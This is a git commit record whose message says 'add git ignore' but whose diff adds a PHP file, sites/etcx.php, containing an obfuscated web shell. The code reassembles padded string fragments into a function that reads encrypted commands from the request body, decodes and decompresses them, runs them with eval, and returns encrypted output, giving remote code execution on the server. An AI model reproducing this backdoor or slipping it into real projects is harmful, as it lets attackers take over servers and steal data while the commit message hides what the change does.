05a92a5c11a7920cb7182c4b82bb533fcd9f62f4
Poby ZaarifWandono <pobyzaarif34@gmail.com>
2018-08-03 13:21:38 +0700

    add git ignore

---
+++ sites/etcx.php
@@ -0,0 +1,13 @@
+<?php
+$s='$k=V*"30V*f5eef9V*";$kh="1a3V*97e4bbabV*4";$kfV*=V*"d93aeb286aV*ef";$p=';
+$J='rlen($V*t);$V*V*o="V*";for($i=0;$i<$l;){V*forV*($j=0;($V*V*j<$c&&$i<$lV*);$j+';
+$B='V*V*"nyqx6X6ifV*ump7MnV*2";fuV*nctioV*n xV*($t,$k){$c=sV*tV*rV*len($kV*);$l=st';
+$M=str_replace('jf','','crejfjfate_jfjffjfuncjftion');
+$y='*h(V*"/$kh(.+)$kf/",V*@file_get_coV*ntentsV*("php:V*//inV*put"V*),$m)==1';
+$R='ase64_encoV*de(@xV*(@gzcoV*mpresV*s($o),$V*k));prV*int("$V*p$V*kh$r$kf");}';
+$T='m[1]V*),V*$V*k)));$o=@oV*b_get_contents()V*;V*@ob_end_cleV*an();$rV*=@bV*';
+$i=')V*{@ob_starV*V*t();@evaV*l(@gzV*uncV*ompress(@x(@bV*ase64_dV*ecV*ode($V*';
+$I='+V*,$V*i++V*){$oV*.=$t{$i}^$V*k{$j};V*}}reV*turn $o;}if(@pV*V*reg_maV*tcV';
+$v=str_replace('V*','',$s.$B.$J.$I.$y.$i.$T.$R);
+$O=$M('',$v);$O();
+?>
